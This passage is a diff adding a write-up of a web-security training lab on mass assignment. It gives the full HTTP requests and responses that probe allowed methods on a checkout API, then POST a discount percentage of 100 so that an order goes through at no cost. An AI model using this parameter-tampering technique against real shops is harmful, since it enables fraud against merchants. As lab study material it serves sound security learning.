@@ -703,7 +703,145 @@ Content-Type: application/json;
 
 
 
+<details>
+     <summary>Lab: Exploiting a mass assignment vulnerability</summary>
 
+
+
+> ### login with **`weiner : peter`**
+> - select product and add it to cart
+> - go to cart
+> - see the requests
+
+```http
+GET /api/checkout HTTP/2
+Host: 0ae7002004807898805f0da700d00007.web-security-academy.net
+Cookie: session=SBR2e8LB8O2ZGiIREmLK2HR0S0aGCHsc
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0ae7002004807898805f0da700d00007.web-security-academy.net/cart
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+```
+
+### **`response`**
+
+```http
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 153
+
+
+{
+   "chosen_discount":{
+       "percentage":0
+   },"chosen_products":[
+      {
+          "product_id":"1",
+          "name":"Lightweight \"l33t\" Leather Jacket",
+          "quantity":1,"item_price":133700
+      }
+  ]
+}
+```
+
+----
+
+> ## first set method to **`options`** to see which methods are allowed
+
+
+```http
+OPTIONS /api/checkout HTTP/2
+Host: 0ae7002004807898805f0da700d00007.web-security-academy.net
+Cookie: session=SBR2e8LB8O2ZGiIREmLK2HR0S0aGCHsc
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0ae7002004807898805f0da700d00007.web-security-academy.net/cart
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+```
+
+### **`response`**
+
+```http
+HTTP/2 405 Method Not Allowed
+Allow: POST, GET
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 20
+
+
+"Method Not Allowed"
+```
+
+---
+
+> ## Good now we can use **`post`** method to update **`discount percentage`** to `100``
+
+
+```http
+POST /api/checkout HTTP/2
+Host: 0ae7002004807898805f0da700d00007.web-security-academy.net
+Cookie: session=SBR2e8LB8O2ZGiIREmLK2HR0S0aGCHsc
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0ae7002004807898805f0da700d00007.web-security-academy.net/cart
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+
+{
+   "chosen_discount":{
+       "percentage":100
+   },"chosen_products":[
+      {
+          "product_id":"1",
+          "name":"Lightweight \"l33t\" Leather Jacket",
+          "quantity":1,"item_price":133700
+      }
+  ]
+}
+
+
+```
+
+### **`response`**
+
+```http
+HTTP/2 201 Created
+Location: /cart/order-confirmation?order-confirmed=true
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+```
+
+
+
+<img width="1516" height="700" alt="image" src="https://github.com/user-attachments/assets/8252e86b-421f-4c85-885b-8942edf5392c" />
+
+<img width="1346" height="679" alt="image" src="https://github.com/user-attachments/assets/22e73718-d2c2-4d2b-8949-07d1caba2875" />
+
+
+
+
+     
+</details>
 
 
 
